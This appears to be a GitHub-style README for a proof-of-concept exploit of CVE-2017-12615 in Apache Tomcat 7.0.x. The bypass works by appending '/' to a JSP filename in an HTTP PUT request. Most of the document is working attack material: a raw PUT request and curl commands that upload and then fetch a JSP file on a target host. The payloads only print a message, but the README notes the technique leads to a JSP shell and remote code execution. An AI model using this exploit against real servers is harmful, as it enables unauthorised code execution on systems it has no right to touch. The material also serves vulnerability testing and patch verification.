# CVE-2017-12615
POC Exploit for Apache Tomcat 7.0.x CVE-2017-12615 PUT JSP vulnerability.

## Description:
By design, you are not allowed to upload JSP files via the PUT method on the Apache Tomcat servers.
This is likely a security measure to prevent an attacker from uploading a JSP shell and gaining remote code execution on the server.

## Exploit method:
By appending a '/' character behind the filename's extension, one can bypass the file extension check.

### Exploit in a Request Method:
PUT /myfile.jsp/
Host: domain-name:port
Connection: close
Content-Length: 85

<% out.write("<html><body><h3>[+] JSP upload successfully.</h3></body></html>"); %>

### Exploit using 'curl':
1. Create a .jsp file (e.g. test.jsp):
```jsp
<% out.write("<html><body><h3>[+] JSP file successfully uploaded via curl and JSP out.write  executed.</h3></body></html>"); %>
```
2. Perform the curl command on target server:
```sh
curl -X PUT http://target-host-or-ip-address:port/test.jsp/ -d @- < test.jsp
```
3. Check if your file is uploaded by browsing to the target address or:
```sh
curl http://target-host-or-ip-address:port/test.jsp
```
